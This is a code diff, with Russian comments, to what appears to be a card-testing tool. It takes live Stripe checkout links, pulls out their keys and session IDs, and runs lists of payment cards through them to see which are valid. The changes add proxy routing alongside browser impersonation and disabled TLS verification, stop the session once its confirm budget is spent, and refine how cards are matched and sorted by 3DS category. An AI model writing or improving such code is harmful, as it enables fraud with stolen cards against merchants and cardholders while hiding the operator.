@@ -28,9 +28,10 @@ sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")
 class CsHitSession:
     """Одна cs_live-сессия:fid -> pk -> PI; несколько карт, пока PI жив."""
 
-    def __init__(self, target_url: str, max_amount_cents: int = config.MAX_PI_AMOUNT_CENTS):
+    def __init__(self, target_url: str, max_amount_cents: int = config.MAX_PI_AMOUNT_CENTS, proxy: str | None = None):
         self.url = target_url.strip()
         self.max_amount = max_amount_cents
+        self.proxy = proxy
         self.s: AsyncSession | None = None
         self.pk = ""
         self.cs = ""
@@ -51,7 +52,7 @@ class CsHitSession:
         self.cs = str(d.get("checkoutSessionId") or "")
         if not self.pk.startswith("pk_live") or not self.cs.startswith("cs_"):
             return False, "не удалось извлечь pk/cs из fid-фрагмента (линк мёртв?)"
-        s = AsyncSession(impersonate=config.pick_impersonate(), verify=False)
+        s = AsyncSession(impersonate=config.pick_impersonate(), verify=False, proxy=self.proxy)
         try:
             r = await s.get(f"https://api.stripe.com/v1/payment_pages/{self.cs}",
                             params={"key": self.pk},
@@ -132,10 +133,10 @@ class CsHitSession:
         except Exception:
             return False
 
-    async def check_card(self, card_raw: str, bin_alpha2: str = "US") -> dict:
+    async def check_card(self, card_raw: str, bin_alpha2: str = "") -> dict:
         if self.s is None:
             return {"status": "ERROR", "detail": "сессия не открыта"}
-        if self.confirms >= config.MAX_CONFIRMS_PER_SECRET and not await self._alive():
+        if self.confirms >= config.MAX_CONFIRMS_PER_SECRET or not await self._alive():
             return {"status": "ERROR", "detail": "confirm-бюджет исчерпан, PI не жив"}
 
         # 1. 3DS Steering & Geo Enrichment
@@ -346,12 +347,13 @@ async def main():
                 bin_steering.ThreeDsCategory.INVALID):
         for p in queue[cat]:
             for orig in cards:
-                if orig.startswith(p.pan) and orig not in ordered_cards:
+                if gc.extract_pan(orig) == p.pan and orig not in ordered_cards:
                     ordered_cards.append(orig)
                     break
     cards = ordered_cards
 
-    gs = CsHitSession(target)
+    norm_proxy = gc.normalize_proxy(proxy) if proxy else None
+    gs = CsHitSession(target, proxy=norm_proxy)
     ok, detail = await gs.open()
     if not ok:
         print(f"[x] open failed: {detail}")
